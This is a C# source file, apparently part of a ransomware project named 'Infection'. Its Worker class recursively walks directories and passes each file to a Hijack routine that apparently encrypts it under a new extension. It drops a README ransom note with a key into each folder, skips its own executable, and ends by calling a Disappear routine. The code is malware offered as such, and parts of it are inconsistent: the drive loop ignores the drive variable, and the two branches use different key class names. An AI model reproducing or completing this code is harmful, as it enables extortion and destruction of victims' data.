using System;
using System.IO;
using System.Linq;

namespace Infection
{
    class Worker
    {
        public static Worker Instance(string EXT) => new Worker(EXT);
        public string EXT;
        public Worker(string EXT)
        {
            this.EXT = EXT;
        }
        public void Run(string[] EXCLUDE_DIRS = null, string[] EXCLUDE_FILES = null, string[] EXCLUDE_EXTS = null)
        {
            
            #if (DEBUG)
                FindTargets(Directory.GetCurrentDirectory(), (TARGET) =>
                {
                    Utils.Hijack(TARGET, EXT, (LOG) => {
                        Console.WriteLine(LOG);
                    });
                    string README_PATH = Path.Combine(Path.GetDirectoryName(TARGET), $"README[{EXT}].txt");
                    if (!File.Exists(README_PATH))
                    {
                        string README = Utils.GetEmbeddedResource("Infection", "README.MD");
                        System.IO.File.WriteAllText(README_PATH, $"{README}\n{VICTIM.Instance.PRIVATE_KEY}");
                    }
                },
                EXCLUDE_DIRS,
                EXCLUDE_FILES,
                EXCLUDE_EXTS);
            #else
                foreach(var drive in DriveInfo.GetDrives().Select(drive => drive.Name))
                {
                    FindTargets(Directory.GetCurrentDirectory(), (TARGET) =>
                    {
                        Utils.Hijack(TARGET, EXT, (LOG) => {
                            Console.WriteLine(LOG);
                        });
                        string README_PATH = Path.Combine(Path.GetDirectoryName(TARGET), $"README[{EXT}].txt");
                        if (!File.Exists(README_PATH))
                        {
                            string README = Utils.GetEmbeddedResource("Infection", "README.MD");
                            System.IO.File.WriteAllText(README_PATH, $"{README}\n{VICTIMKEY.Instance.PRIVATE_KEY}");
                        }
                    },
                    EXCLUDE_DIRS,
                    EXCLUDE_FILES,
                    EXCLUDE_EXTS);
                }
            #endif
            Utils.Disappear();
        }


        private void FindTargets(string PATH, Action<string> TARGET, string[] EXCLUDE_DIRS = null, string[] EXCLUDE_FILES = null, string[] EXCLUDE_EXTS = null)
        {
            try
            {
                foreach (string EACH_NODE in Directory.GetFiles(PATH).Where(elem => {
                    if(EXCLUDE_FILES != null && EXCLUDE_FILES.Contains(elem.Replace(@"\", "/").Split('/').Last()))
                    {
                        return false;
                    }
                    if(EXCLUDE_EXTS != null && EXCLUDE_EXTS.Contains(elem.Split('.').Last()))
                    {
                        return false;
                    }
                    if (elem.ToLower().EndsWith(this.EXT.ToLower()))
                    {
                        return false;
                    }
                    if(elem == System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)
                    {
                        return false;
                    }
                    if(elem == Path.Combine(Path.GetDirectoryName(elem), $"README[{EXT}].txt"))
                    {
                        return false;
                    }
                    return true;
                }))
                {
                    TARGET(EACH_NODE);
                }
            }
            catch { }

            try
            {
                foreach (string EACH_NODE in Directory.GetDirectories(PATH).Where(elem => EXCLUDE_DIRS != null ? !EXCLUDE_DIRS.Contains(elem) : true))
                {
                    FindTargets(EACH_NODE, TARGET, EXCLUDE_DIRS, EXCLUDE_FILES, EXCLUDE_EXTS);
                }
            }
            catch { }
        }
    }
}
